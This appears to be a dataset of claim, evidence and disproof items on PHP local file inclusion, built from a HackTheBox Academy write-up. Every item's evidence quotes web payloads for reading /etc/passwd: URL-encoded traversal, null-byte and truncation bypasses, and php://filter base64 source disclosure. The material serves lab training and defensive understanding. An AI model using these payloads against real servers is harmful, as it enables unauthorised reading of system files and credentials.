items.claim: A local file inclusion filter that strips '../' is bypassed by re-encoding the traversal (%2e%2e%2f), because the filter matches the decoded form the request never carries.
items.body:
In practice on HTB this shows up as: | `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |

Write-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/28. File Inclusion/File Inclusion.md (973 words, classified web).
items.disproof: Refuted when the server percent-decodes the parameter before filtering, in which case the encoded sequence is normalised to ../ and rejected; the bypass only exists where filtering happens on the raw, undecoded request value.

items.claim: Including an attacker-influenced path lets an absolute path such as /etc/passwd or the Windows hosts file be read without any traversal sequence at all.
items.body:
In practice on HTB this shows up as: | `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |

Write-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/28. File Inclusion/File Inclusion.md (973 words, classified web).
items.disproof: Refuted when the application validates the path against an allow-list of permitted directories rather than rejecting traversal sequences, in which case an absolute path outside the allow-list is refused.

items.claim: php://filter with a base64-encode conversion stream reads a PHP source file as base64, turning a file read into source disclosure that reveals credentials inside the code.
items.body:
In practice on HTB this shows up as: | `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |

Write-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/28. File Inclusion/File Inclusion.md (973 words, classified web).
items.disproof: Refuted when the wrapper scheme is disabled or the allow-list excludes any path containing a stream wrapper, in which case the request returns no source text.
